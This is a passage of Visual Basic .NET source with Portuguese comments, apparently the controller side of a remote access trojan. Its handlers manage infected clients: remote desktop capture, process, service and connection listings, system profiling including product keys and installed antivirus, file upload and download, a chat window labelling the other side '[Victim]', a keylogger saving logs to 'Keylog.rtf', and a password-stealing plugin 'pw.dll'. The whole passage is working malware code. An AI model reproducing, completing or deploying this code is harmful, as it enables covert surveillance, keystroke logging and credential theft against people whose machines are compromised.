                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Mennsagges" & client.ip)), FrmMsgBox) Is Nothing) Then
                        Dim shl As New FrmMsgBox
                        shl.Name = ("Mennsagges" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return
                    '=================================================================================================================================================================================



























































                    'GERENCIADOR DE SERVIÇOS===========================================================================================================================================================================================================================================
                Case "ChamaFrmServiçosS"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Sevosisssss" & client.ip)), FrmServiços) Is Nothing) Then
                        Dim shl As New FrmServiços
                        shl.Name = ("Sevosisssss" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviarDadosServiçoss"
                    Dim shl2 As FrmServiços = DirectCast(MdSokserver.Gform(("Sevosisssss" & client.ip)), FrmServiços)
                    If (Not shl2 Is Nothing) Then

                        Try

                            shl2.ListView1.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), vbNewLine)
                            For Each x In allProcess
                                If Not x = "" Then
                                    Dim xx As String() = Split(x, "|")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(0)
                                    itm.SubItems.Add(xx(1))
                                    itm.SubItems.Add(xx(2))
                                    itm.SubItems.Add(xx(3))
                                    itm.ImageIndex = 0
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                End If
                            Next
                            shl2.lbStatus.Text = "Status : Serviços (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                        Catch exception1 As Exception

                        End Try

                    End If
                    Return
                    '=================================================================================================================================================================================



























                    'LISTA DE CONEXÕES==================================================================================================================================================================================================
                Case "ChamaFrmConexaoo"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("COnsd" & client.ip)), FrmConexão) Is Nothing) Then
                        Dim shl As New FrmConexão
                        shl.Name = ("COnsd" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviarDadosConexaooo"
                    Dim shl2 As FrmConexão = DirectCast(MdSokserver.Gform(("COnsd" & client.ip)), FrmConexão)
                    If (Not shl2 Is Nothing) Then

                        Try

                            shl2.LVConexões.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), vbCrLf)
                            For Each x In allProcess
                                If Not x = "" Then
                                    Dim xx As String() = Split(x, "|")
                                    Dim itm As New ListViewItem
                                    itm.Text = "TCP"
                                    itm.SubItems.Add(xx(0))
                                    itm.SubItems.Add(xx(1))
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    shl2.LVConexões.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.LVConexões.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                End If
                            Next
                            shl2.lbStatus.Text = "Status : Conexões (" & shl2.LVConexões.Items.Count & "/" & (allProcess.Length - 1) & ")"

                        Catch exception1 As Exception

                        End Try

                    End If
                    Return
                    '==============================================================================================================================================================================================================================













































































                    'GERENCIADOR DE TAREFAS===================================================================================================================================================================================================================================
                Case "ChamaFormGerenciadorTareefeas"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("SDAFSDAdeFSDAF" & client.ip)), FrmProcessos) Is Nothing) Then
                        Dim shl As New FrmProcessos
                        shl.Name = ("SDAFSDAdeFSDAF" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "ChamaListProcesss"
                    Dim shl2 As FrmProcessos = DirectCast(MdSokserver.Gform(("SDAFSDAdeFSDAF" & client.ip)), FrmProcessos)
                    If (Not shl2 Is Nothing) Then

                        Try
                            shl2.LvListProcess.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), "ProcessSplit")
                            For Each x In allProcess
                                If Not x = "" Then
                                    Dim xx As String() = Split(x, "|")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(0)
                                    itm.SubItems.Add(xx(1))
                                    If xx(2) = "-" Then xx(2) = "Sistema"
                                    itm.SubItems.Add(xx(2))
                                    itm.SubItems.Add(FormatNumber(Math.Round(xx(3) / 1024), 0))
                                    If xx(4) = "-" Then xx(4) = "Windows"
                                    itm.SubItems.Add(xx(4))

                                    If itm.Text = "opera" Then
                                        itm.ImageIndex = 1
                                    ElseIf itm.Text = "explorer" Then
                                        itm.ImageIndex = 2
                                    ElseIf itm.Text = "SbieCtrl" Then
                                        itm.ImageIndex = 3
                                    ElseIf itm.Text = "firefox" Then
                                        itm.ImageIndex = 4
                                    ElseIf itm.Text = "ResourceHacker" Or itm.Text = "Res" Then
                                        itm.ImageIndex = 5
                                    ElseIf itm.Text = "procexp" Then
                                        itm.ImageIndex = 6
                                    ElseIf itm.Text = "ProcessHacker" Then
                                        itm.ImageIndex = 7
                                    ElseIf itm.Text = "chrome" Then
                                        itm.ImageIndex = 8
                                    ElseIf itm.Text = "iexplore" Then
                                        itm.ImageIndex = 9
                                    Else
                                        itm.ImageIndex = 0
                                    End If

                                    shl2.LvListProcess.Items.Add(itm)

                                    shl2.lbStatus.Text = "Verificando Aguarde : (" & shl2.LvListProcess.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                End If
                            Next

                            shl2.LvListProcess.FindItemWithText(strArray(2)).ForeColor = Color.Green
                            shl2.LvListProcess.FindItemWithText(strArray(2)).ImageIndex = 10

                            shl2.lbStatus.Text = "Processos em Execução : (" & shl2.LvListProcess.Items.Count & "/" & (allProcess.Length - 1) & ")"
                        Catch ex As Exception

                        End Try

                    End If
                    Return
                    '=========================================================================================================================================================================================================================================================================


















































                    'REMOTE DESKTOP "DESKTOP-01"=============================================================================================================================================================================================================================================================
                Case "ChamaFormDesktop"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("YYYSHSNDNN" & client.ip)), Cap) Is Nothing) Then
                        Dim shl As New Cap
                        shl.Name = ("YYYSHSNDNN" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(3)
                        shl.F = client
                        shl.Sz = New Size(strArray(1), strArray(2))
                        shl.Show()
                    End If
                    Return

                Case "Meu@"
                    Dim shl2 As Cap = DirectCast(MdSokserver.Gform(("YYYSHSNDNN" & client.ip)), Cap)
                    If (Not shl2 Is Nothing) Then

                        Try
                            If strArray(1).Length = 1 Then
                                If shl2.btnIniciar.Text = "Parar" Then
                                    shl2.F.Send("Meu@" & Y & shl2.C1.SelectedIndex & Y & shl2.C2.Text & Y & shl2.C.Value)
                                End If
                                Exit Sub
                            End If
                            Dim BB As Byte() = fx(b, "Meu@" & Y)(1)
                            shl2.PktToImage(BB)
                        Catch ex As Exception

                        End Try

                    End If

                    Return

                Case "@@" ' i recive image  
                    Dim BB As Byte() = fx(b, "@@" & Y)(1)
                    '==============================================================================================================================================================================================















                    'INFORMAÇÕES DO SERVIDOR======================================================================================================================================================================================================================================================
                Case "ChamaFormInformacao"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("WQWWWFDDFGFGHFDH" & client.ip)), FrmInformações) Is Nothing) Then
                        Dim shl As New FrmInformações
                        shl.Name = ("WQWWWFDDFGFGHFDH" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviaResultadoInformacoes"
                    Dim shl2 As FrmInformações = DirectCast(MdSokserver.Gform(("WQWWWFDDFGFGHFDH" & client.ip)), FrmInformações)
                    If (Not shl2 Is Nothing) Then
                        Try
                            For x As Integer = 0 To (strArray.Length - 1)

                                If x = 0 Then
                                    shl2.TRInformações.Nodes(0).Nodes(0).Text = "Localização : " & strArray(1)
                                ElseIf x = 1 Then
                                    shl2.TRInformações.Nodes(0).Nodes(1).Text = "Atributos : " & strArray(2)
                                ElseIf x = 2 Then
                                    shl2.TRInformações.Nodes(0).Nodes(2).Text = "Diretório : " & strArray(3)
                                ElseIf x = 3 Then
                                    shl2.TRInformações.Nodes(0).Nodes(3).Text = "Port : " & strArray(4)
                                ElseIf x = 4 Then
                                    shl2.TRInformações.Nodes(0).Nodes(4).Text = "Host : " & strArray(5)
                                ElseIf x = 5 Then
                                    shl2.TRInformações.Nodes(0).Nodes(5).Text = "Servidor : " & strArray(6)
                                ElseIf x = 6 Then
                                    shl2.TRInformações.Nodes(0).Nodes(6).Text = "Data de Instalação : " & strArray(7)
                                    shl2.TRInformações.Nodes(0).Expand()
                                    '======================================================================================================
                                ElseIf x = 7 Then
                                    shl2.TRInformações.Nodes(1).Nodes(0).Text = "IPV4 : " & strArray(8)
                                ElseIf x = 8 Then
                                    shl2.TRInformações.Nodes(1).Nodes(1).Text = "IP Local : " & strArray(9)
                                ElseIf x = 9 Then
                                    shl2.TRInformações.Nodes(1).Nodes(2).Text = "Endereço MAC : " & strArray(10)
                                    shl2.TRInformações.Nodes(1).Expand()
                                    '======================================================================================================
                                ElseIf x = 10 Then
                                    shl2.TRInformações.Nodes(2).Nodes(0).Text = "Nome do Computador : " & strArray(11)
                                ElseIf x = 11 Then
                                    shl2.TRInformações.Nodes(2).Nodes(1).Text = "Nome do Domínio : " & strArray(12)
                                ElseIf x = 12 Then
                                    shl2.TRInformações.Nodes(2).Nodes(2).Text = "Nome de Usuário : " & strArray(13)
                                ElseIf x = 13 Then
                                    shl2.TRInformações.Nodes(2).Nodes(3).Text = "Monitors : " & strArray(14)
                                ElseIf x = 14 Then
                                    shl2.TRInformações.Nodes(2).Nodes(4).Text = "Resolução : " & strArray(15)
                                ElseIf x = 15 Then
                                    shl2.TRInformações.Nodes(2).Nodes(5).Text = "Sistema Operacional : " & strArray(16)
                                ElseIf x = 16 Then
                                    shl2.TRInformações.Nodes(2).Nodes(6).Text = "Plataforma do Sistema : " & strArray(17)
                                ElseIf x = 17 Then
                                    shl2.TRInformações.Nodes(2).Nodes(7).Text = "Versão do Sistema : " & strArray(18)
                                ElseIf x = 18 Then
                                    shl2.TRInformações.Nodes(2).Nodes(8).Text = "RAM : " & strArray(19)
                                ElseIf x = 19 Then
                                    shl2.TRInformações.Nodes(2).Nodes(9).Text = "Bateria : " & strArray(20)
                                ElseIf x = 20 Then
                                    shl2.TRInformações.Nodes(2).Nodes(10).Text = "Informações CPU : " & strArray(21)
                                ElseIf x = 21 Then
                                    shl2.TRInformações.Nodes(2).Nodes(11).Text = "Informações GPU : " & strArray(22)
                                ElseIf x = 22 Then
                                    shl2.TRInformações.Nodes(2).Nodes(12).Text = "UpTime : " & strArray(23)
                                ElseIf x = 23 Then
                                    shl2.TRInformações.Nodes(2).Nodes(13).Text = "Identificador : " & strArray(24)
                                ElseIf x = 24 Then
                                    shl2.TRInformações.Nodes(2).Nodes(14).Text = "Data/Hora : " & strArray(25)
                                ElseIf x = 25 Then
                                    shl2.TRInformações.Nodes(2).Nodes(15).Text = "Cam : " & strArray(26)
                                ElseIf x = 26 Then
                                    shl2.TRInformações.Nodes(2).Nodes(16).Text = "Janelas : " & strArray(27)
                                ElseIf x = 27 Then
                                    shl2.TRInformações.Nodes(2).Nodes(17).Text = "Pasta do Sistema : " & strArray(28)
                                ElseIf x = 28 Then
                                    shl2.TRInformações.Nodes(2).Nodes(18).Text = "Idioma : " & strArray(29)
                                ElseIf x = 29 Then
                                    shl2.TRInformações.Nodes(2).Nodes(19).Text = "País : " & strArray(30)
                                ElseIf x = 30 Then
                                    shl2.TRInformações.Nodes(2).Nodes(20).Text = "Tipo de Sistema : " & strArray(31)
                                ElseIf x = 31 Then
                                    shl2.TRInformações.Nodes(2).Nodes(21).Text = "Medelo do Sistema : " & strArray(32)
                                ElseIf x = 32 Then
                                    shl2.TRInformações.Nodes(2).Nodes(22).Text = "Versao/Data da BIOS : " & strArray(33)
                                    shl2.TRInformações.Nodes(2).Expand()
                                    '=====================================================================================================================================
                                ElseIf x = 33 Then
                                    shl2.TRInformações.Nodes(3).Nodes(0).Text = "Proprietário Registrado : " & strArray(34)
                                ElseIf x = 34 Then
                                    shl2.TRInformações.Nodes(3).Nodes(1).Text = "Organização Registrada : " & strArray(35)
                                ElseIf x = 35 Then
                                    shl2.TRInformações.Nodes(3).Nodes(2).Text = "Chave do Produto : " & strArray(36)
                                ElseIf x = 36 Then
                                    shl2.TRInformações.Nodes(3).Nodes(3).Text = "AntiVirus Instalado : " & strArray(37)
                                ElseIf x = 37 Then
                                    shl2.TRInformações.Nodes(3).Nodes(4).Text = "Firewall : " & strArray(38)
                                    shl2.TRInformações.Nodes(3).Expand()
                                End If

                                shl2.PBProgress.Value = x
                            Next
                            shl2.btnOK.Enabled = True
                        Catch ex As Exception
                            shl2.btnOK.Enabled = True
                        End Try
                    End If
                    Return
                    '===========================================================================================================================================================================================================================================























                    'ENVIAR ARQUIVO POR URL================================================================================================================================================================================================================================
                Case "ChamaFrmBaixaURL"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("EnviiFff" & client.ip)), FrmEnviarURL) Is Nothing) Then
                        Dim shl As New FrmEnviarURL
                        shl.Name = ("EnviiFff" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return
                    '===========================================================================================================================================================================================================================================






































                    'PROGRAMAS INSTALADOS================================================================================================================================================================================================================================
                Case "ChamaFormProgramas"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("IIISNNNNSSSS" & client.ip)), FrmProgramasInstalados) Is Nothing) Then
                        Dim shl As New FrmProgramasInstalados
                        shl.Name = ("IIISNNNNSSSS" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "LiiiistaProgramas"
                    Dim shl2 As FrmProgramasInstalados = DirectCast(MdSokserver.Gform(("IIISNNNNSSSS" & client.ip)), FrmProgramasInstalados)
                    If (Not shl2 Is Nothing) Then
                        Try

                            shl2.LVListProgramas.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), vbNewLine)
                            For Each x In allProcess
                                If Not x = "N/A%|%" Then
                                    Dim xx As String() = Split(x, "%|%")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(0)
                                    itm.ImageIndex = 0
                                    shl2.LVListProgramas.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.LVListProgramas.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                End If
                            Next
                            shl2.lbStatus.Text = "Status : Programas (" & shl2.LVListProgramas.Items.Count & "/" & (allProcess.Length - 1) & ")"
                        Catch ex As Exception

                        End Try
                    End If
                    Return
                    '==================================================================================================================================================================================================================



































                Case "rsc"
                    Dim shl3 As FrmCMDd = DirectCast(MdSokserver.Gform(("sh" & client.ip)), FrmCMDd)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If
                    Return
                Case "sc~"
                    client.L = New ListViewItem
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("sc" & client.ip)), FrmDesktop) Is Nothing) Then
                        Dim sc As New FrmDesktop
                        sc.osk = MdSokserver.W.GetClient(strArray(1))
                        sc.sz = New Size(Conversions.ToInteger(strArray(2)), Conversions.ToInteger(strArray(3)))
                        sc.P.Image = New Bitmap(sc.sz.Width, sc.sz.Height)
                        sc.sk = client
                        sc.Name = ("sc" & client.ip)
                        sc.Show()
                    End If
                    Return
                Case "upk"
                    Dim sc2 As FrmDesktop = DirectCast(MdSokserver.Gform(("sc" & strArray(1))), FrmDesktop)
                    Return
            End Select




            If (str4 = "scPK") Then
                Dim sc3 As FrmDesktop = DirectCast(MdSokserver.Gform(("sc" & strArray(1))), FrmDesktop)
                If (sc3 Is Nothing) Then
                    client.CN = False
                    Return
                End If
                If (client.L Is Nothing) Then
                    client.L = New ListViewItem
                End If
                Dim p As PictureBox = sc3.P
                SyncLock p
                    If (sc3.Button1.Text = "Stop") Then
                    End If
                    ' MsgBox(strArray(2))
                    Dim gstr1 As String = Split(strArray(2), ",", -1, CompareMethod.Binary)(0)
                    '  MsgBox(strArray(1))
                    Dim gstr2 As String = Split(strArray(2), ",", -1, CompareMethod.Binary)(1)
                    '   MsgBox(strArray(2))
                    Dim size As New Size(Conversions.ToInteger(Strings.Split(strArray(2), ",", -1, CompareMethod.Binary)(0)), Conversions.ToInteger(Strings.Split(strArray(2), ",", -1, CompareMethod.Binary)(1)))
                    Dim bitmap2 As New Bitmap(size.Width, size.Height)
                    Dim graphics As Graphics = graphics.FromImage(bitmap2)
                    Dim num9 As Integer = 0
                    Dim bitmap As Bitmap = DirectCast(sc3.P.Image.Clone, Bitmap)
Label_0B5C:
                    Try
                        graphics.DrawImage(bitmap.GetThumbnailImage(size.Width, size.Height, Nothing, IntPtr.Zero), 0, 0)
                    Catch exception21 As Exception
                        ProjectData.SetProjectError(exception21)
                        Dim exception5 As Exception = exception21
                        num9 += 1
                        If (num9 <> 5) Then
                            ProjectData.ClearProjectError()
                            GoTo Label_0B5C
                        End If
                        ProjectData.ClearProjectError()
                    End Try
                    Dim strArray3 As String() = Strings.Split(strArray(3), ",", -1, CompareMethod.Binary)
                    Dim stream As New MemoryStream(Convert.FromBase64String(strArray3(2)))
                    Dim image As Image = image.FromStream(stream)
Label_0BD3:
                    Try
                        Dim point As New Point(Conversions.ToInteger(strArray3(0)), Conversions.ToInteger(strArray3(1)))
                        graphics.DrawImage(image, point)
                    Catch exception22 As Exception
                        ProjectData.SetProjectError(exception22)
                        Dim exception6 As Exception = exception22
                        If (Not sc3 Is Nothing) Then
                            ProjectData.ClearProjectError()
                            GoTo Label_0BD3
                        End If
                        ProjectData.ClearProjectError()
                    End Try
                    graphics.Dispose()
                    If sc3.CheckBox3.Checked Then
                        Try
                            bitmap2.Save((sc3.Folder & TimeOfDay.TimeOfDay.ToString.Replace("/", "").Replace(":", "-") & Conversions.ToString(CInt(Math.Round(CDbl((CDbl(TimeOfDay.Millisecond) / 1000))))) & ".jpg"))
                        Catch exception23 As Exception
                            ProjectData.SetProjectError(exception23)
                            Dim exception7 As Exception = exception23
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    sc3.P.Image = bitmap2
                    sc3.Text = (sc3.QQ & " ~Packet[" & MdFN.Siz(CLng(b.Length)) & "]")
                    Return
                End SyncLock
            End If
















            'CHATE=================================================================================================================================================================================================================================
            If (str4 = "CH") Then

                If (client.L Is Nothing) Then
                    client.L = New ListViewItem
                End If

                If MdSokserver.F.InvokeRequired Then
                    MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                Else

                    Dim chat As FrmChate = DirectCast(MdSokserver.Gform(("ch" & client.ip)), FrmChate)
                    Dim str7 As String = strArray(2)
                    If (str7 = "~") Then

                        If (chat Is Nothing) Then
                            chat = New FrmChate
                            chat.Name = ("ch" & client.ip)
                            chat.sk = client
                            chat.osk = MdSokserver.W.GetClient(strArray(1))
                            chat.T2.Enabled = False
                            chat.Button1.Enabled = False
                            chat.Show()
                        End If

                    Else


                        If (str7 = "!") Then
                            chat.T2.Enabled = True
                            chat.Button1.Enabled = True
                            Dim chat2 As FrmChate = chat
                            SyncLock chat2
                                chat.T1.AppendText("Connected .." & ChrW(13) & ChrW(10))
                                Return
                            End SyncLock
                        End If


                        If (str7 = "@") Then
                            Dim chat3 As FrmChate = chat
                            SyncLock chat3
                                chat.T1.SelectionStart = chat.T1.TextLength
                                chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
                                chat.T1.AppendText("[Victim] ")
                                chat.T1.SelectionFont = chat.T1.Font
                                chat.T1.AppendText((MdFN.DEB(strArray(3)) & ChrW(13) & ChrW(10)))
                                chat.T1.SelectionStart = chat.T1.TextLength
                                chat.T1.ScrollToCaret()
                            End SyncLock
                        End If


                    End If

                End If
                '=====================================================================================================================================================================================================================================================================







            Else





                'KEYLOGGER=============================================================================================================================================================================================================================================
                If (str4 = "kla") Then
                    Dim kl As FrmKeylogger = DirectCast(MdSokserver.Gform(("kl" & client.ip)), FrmKeylogger)
                    Dim kl3 As FrmKeylogger = kl
                    SyncLock kl3
                        kl.RSLogs.Clear()
                        Dim strArray4 As String() = Strings.Split(MdFN.DEB(strArray(1)), ChrW(13) & ChrW(10), -1, CompareMethod.Binary)
                        kl.ProgressBar1.Value = 0
                        kl.ProgressBar1.Maximum = strArray4.Length
                        Dim str As String
                        For Each str In strArray4
                            kl.insert(str)
                            bar = kl.ProgressBar1
                            bar.Value += 1
                        Next
                        kl.RSLogs.ScrollToCaret()
                        kl.ProgressBar1.Value = 0
                        If Not Directory.Exists(client.Folder) Then
                            Directory.CreateDirectory(client.Folder)
                        End If
                        kl.RSLogs.SaveFile((client.Folder & "Keylog.rtf"))
                        Return
                    End SyncLock
                End If


                If (str4 = "kl") Then
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        If (MdSokserver.Gform(("kl" & client.ip)) Is Nothing) Then
                            Dim kl2 As New FrmKeylogger
                            kl2.c = client
                            kl2.Name = ("kl" & client.ip)
                            kl2.Text = Conversions.ToString(MdSokserver.vno(client.L))
                            kl2.Show()
                        End If
                        Dim newThread As New Thread(AddressOf MdSokserver.Req)
                        newThread.Start(New Object() {client, MdFN.SB(("kla" & MdSokserver.Y & strArray(1)))})
                    End If
                    '=========================================================================================================================================================================================================================================================











                    'SENHAS============================================================================================================================================================================================================================
                ElseIf (str4 = "ret") Then

                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Dim str8 As String = strArray(1)
                        If (str8 = MdSokserver.GETPLG("pw.dll", Nothing).Hash) Then
                            Dim pass As FrmSenhas = DirectCast(MdSokserver.Gform("Pass"), FrmSenhas)
                            If (pass Is Nothing) Then
                                pass = New FrmSenhas
                                pass.Show()
                            End If
                            pass.XD(client, MdFN.DEB(strArray(2)))
                        End If
                    End If
                    '=============================================================================================================================================================================================================================























                    'MINE INFORMAÇÕES========================================================================================================================================================================================================
                ElseIf (str4 = "inf") Then
                    Dim list As New List(Of String)
                    list.Add(MdFN.DEB(strArray(1)))
                    Dim num23 As Integer = (strArray.Length - 1)
                    Dim k As Integer = 2
                    Do While (k <= num23)
                        list.Add(strArray(k))
                        k += 1
                    Loop
                    client.snf = list.ToArray
                    If (MdSokserver.F.CEL Is client) Then

                        MdSokserver.F.LVListInfoO.Items.Item(0).Text = client.snf(0)

                        MdSokserver.F.LVListInfoO.Items.Item(1).Text = client.snf(1)

                        MdSokserver.F.LVListInfoO.Items.Item(2).Text = client.snf(2)

                        MdSokserver.F.LVListInfoO.Items.Item(3).Text = client.snf(3)

                        MdSokserver.F.LVListInfoO.Items.Item(4).Text = client.snf(4)

                        MdSokserver.F.LVListInfoO.Items.Item(5).Text = client.snf(5)

                        MdSokserver.F.LVListInfoO.Items.Item(6).Text = client.snf(6)

                        MdSokserver.F.LVListInfoO.Items.Item(7).Text = "%" & client.snf(7) & "%"

                        MdSokserver.F.LVListInfoO.Items.Item(8).Text = client.snf(8)

                        MdSokserver.F.LVListInfoO.Items.Item(9).Text = client.snf(9)

                        MdSokserver.F.LVListInfoO.Items.Item(10).Text = client.snf(10)

                    End If
                    '============================================================================================================================================================================================================================================================================================


















                    'DOWNLOAD ARQUIVOS "GERENCIADOR DE ARQUIVOS"==================================================================================================================================================================================================================================
                ElseIf (str4 = "dw") Then
                    Dim dw3 As FrmDownload = DirectCast(MdSokserver.Gform((client.ip & strArray(1))), FrmDownload)
                    If (dw3 Is Nothing) Then
                        client.Send(("close" & MdSokserver.Y & strArray(1)))
                    Else
                        Dim buffer5 As Byte() = DirectCast(NewLateBinding.LateIndexGet(MdFN.fx(b, ("dw" & MdSokserver.Y & strArray(1) & MdSokserver.Y)), New Object() {1}, Nothing), Byte())
                        dw3.FS.Write(buffer5, 0, buffer5.Length)
                        dw3.FS.Flush()
                        bar = dw3.ProgressBar1
                        bar.Value = (bar.Value + buffer5.Length)
                        If (dw3.FS.Length = dw3.SZ) Then
                            dw3.FS.Close()
                            client.Send(("close" & MdSokserver.Y & strArray(1)))
                            dw3.Button1.Text = "Save"
                        Else
                            client.Send(("de" & MdSokserver.Y & strArray(1)))
                        End If
                    End If
                    '=====================================================================================================================================================================================================================================================



















                    'ENVIAR ARQUIVOS "GERENCIADOR DE ARQUIVOS"===============================================================================================================================================================================
                ElseIf (str4 = "up") Then
                    Dim up2 As FrmUpload = DirectCast(MdSokserver.Gform((client.ip & strArray(1))), FrmUpload)
                    If (up2 Is Nothing) Then
                        client.Send(("close" & MdSokserver.Y & strArray(1)))
                    ElseIf (up2.ProgressBar1.Value = up2.ProgressBar1.Maximum) Then
                        client.Send(("close" & MdSokserver.Y & strArray(1)))
                        up2.FS.Close()
                        up2.FS.Dispose()
                        up2.Close()
                    Else
                        Dim buffer6 As Byte() = New Byte(&H1401 - 1) {}
                        Dim num11 As Integer = up2.FS.Read(buffer6, 0, buffer6.Length)
                        bar = up2.ProgressBar1
                        bar.Value = (bar.Value + num11)
                        Dim stream2 As New MemoryStream
                        Dim s As String = ("wd" & MdSokserver.Y & strArray(1) & MdSokserver.Y)
                        stream2.Write(MdFN.SB(s), 0, s.Length)
                        stream2.Write(buffer6, 0, num11)
                        client.Send(stream2.ToArray)
                        stream2.Dispose()
                    End If
                    '=====================================================================================================================================================================================================================















                    'GERENCIADOR DE ARQUIVOS "AVANÇADO"==========================================================================================================================================================================================
                ElseIf (str4 = "FM") Then
                    If (client.L Is Nothing) Then
                        client.L = New ListViewItem
                    End If
                    Dim fm As FrmGerenciadorArquivos = DirectCast(MdSokserver.Gform(("fm" & client.ip)), FrmGerenciadorArquivos)
                    Select Case strArray(2)
                        Case "dw"
                            If MdSokserver.F.InvokeRequired Then
                                MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                Dim dw4 As New FrmDownload
                                dw4.FNNNN = strArray(3)
                                dw4.SZ = Conversions.ToInteger(strArray(4))
                                dw4.c = client
                                dw4.ProgressBar1.Maximum = dw4.SZ
                                dw4.Show()
                                client.Send(("de" & MdSokserver.Y & dw4.FNNNN))
                            End If
                            Exit Select
                        Case "~"
                            If (fm Is Nothing) Then
                                If MdSokserver.F.InvokeRequired Then
                                    MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                                Else
                                    fm = New FrmGerenciadorArquivos
                                    fm.sk = client
                                    fm.osk = MdSokserver.W.GetClient(strArray(1))
                                    fm.Name = ("fm" & client.ip)
                                    fm.Show()
                                End If
                            End If
                            Exit Select
                        Case "!"
                            fm.L1.Items.Clear()
                            Dim num24 As Integer = (strArray.Length - 1)
                            Dim m As Integer = 3
                            Do While (m <= num24)
                                Dim strArray5 As String() = Strings.Split(MdFN.DEB(strArray(m)), ";", -1, CompareMethod.Binary)
                                Dim info As New DirectoryInfo(strArray5(0))
                                Dim item2 As ListViewItem = fm.L1.Items.Add(info.Name)
                                item2.ToolTipText = info.FullName
                                item2.SubItems.Add(strArray5(1))
                                Dim str10 As String = strArray5(1)
                                If (str10 = DriveType.Fixed.ToString) Then
                                    item2.ImageIndex = 1
                                ElseIf (str10 = DriveType.Removable.ToString) Then
                                    item2.ImageIndex = 3
                                ElseIf (str10 = DriveType.CDRom.ToString) Then
                                    item2.ImageIndex = 2
                                Else
                                    item2.ImageIndex = 0
                                    item2.SubItems.Item(1).Text = "Diretório"
                                End If
                                m += 1
                            Loop
                            fm.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Exit Select
                        Case "@"
                            Dim bar3 As ToolStripProgressBar = fm.pr
                            SyncLock bar3
                                If fm.Cache.Contains(MdFN.DEB(strArray(3))) Then
                                    fm.Cache.Remove(MdFN.DEB(strArray(3)))
                                End If
                                Dim mcach As New MdFMcach
                                mcach.Path = MdFN.DEB(strArray(3))
                                fm.Cache.Add(mcach, mcach.Path, Nothing, Nothing)
